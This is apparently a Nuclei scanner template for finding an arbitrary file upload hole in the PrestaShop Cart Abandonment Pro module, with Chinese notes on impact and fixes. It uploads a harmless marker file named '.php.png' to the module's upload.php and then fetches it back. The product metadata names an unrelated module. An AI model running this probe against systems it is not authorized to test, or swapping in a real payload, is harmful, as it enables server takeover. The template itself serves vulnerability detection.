id: prestashop-cartabandonmentpro-file-upload

info:
  name: Prestashop Cart Abandonment Pro - 任意文件上传漏洞
  author: MaStErChO
  severity: critical
  description: |
    该模板用于检测 Prestashop Cart Abandonment Pro - 任意文件上传漏洞。该类漏洞通常源于上传接口缺少认证、文件类型校验、存储隔离或执行权限控制。模板会向 `/modules/{{paths}}/upload.php`、`{{matched_path}}uploads/{{filename}}.php.png` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可能上传脚本、WebShell 或恶意文件，并借此执行代码或长期控制服务器。
    - 上传目录若可被访问或解析，可能导致数据篡改、恶意内容投递和业务系统被接管。
  remediation: |
    - 为上传接口增加认证授权和 CSRF 防护，限制可上传文件类型、大小和扩展名。
    - 在服务端校验文件内容与 MIME 类型，将上传文件存储到不可执行目录并使用随机文件名。
    - 清理异常上传文件，复核上传目录解析配置、访问日志和可疑账号活动。
  reference:
    - https://www.openservis.cz/prestashop-blog/nejcastejsi-utoky-v-roce-2023-seznam-deravych-modulu-nemate-nejaky-z-nich-na-e-shopu-i-vy/
    - https://dh42.com/blog/prestashop-security/
  classification:
    cwe-id: CWE-434
  metadata:
    verified: true
    max-request: 2
    framework: prestashop
    shodan-query: "http.component:\"prestashop\""
    product: ap_pagebuilder
    vendor: apollotheme
  tags: intrusive,fileupload,cartabandonmentpro,prestashop,vuln

flow: http(1) && http(2)

variables:
  filename: '{{rand_base(7, "abc")}}'
  string: '{{rand_base(7, "abc")}}'

http:
  - raw:
      - |
        POST /modules/{{paths}}/upload.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=xYzZY

        --xYzZY
        Content-Disposition: form-data; name="image"; filename="{{filename}}.php.png"
        Content-Type: image/png

        <html>
        <!-- {{string}} -->
        </html>

        --xYzZY--

    payloads:
      paths:
        - 'cartabandonmentpro'
        - 'cartabandonmentproOld'
        - 'cartabandonmentpro_Old'
        - 'cartabandonmentpro2'
        - 'pscartabandonmentpro'

    stop-at-first-match: true

    matchers:
      - type: dsl
        dsl:
          - 'contains(content_type, "text/html")'
          - 'contains(body, "{{filename}}.php.png")'
          - 'status_code == 200'
        condition: and
        internal: true

    extractors:
      - type: regex
        name: matched_path
        part: request
        internal: true
        regex:
          - '\/modules\/([^\/]+)\/'

  - raw:
      - |
        GET {{matched_path}}uploads/{{filename}}.php.png HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'contains(content_type, "image/png")'
          - 'contains(body, "{{string}}")'
          - 'status_code == 200'
        condition: and
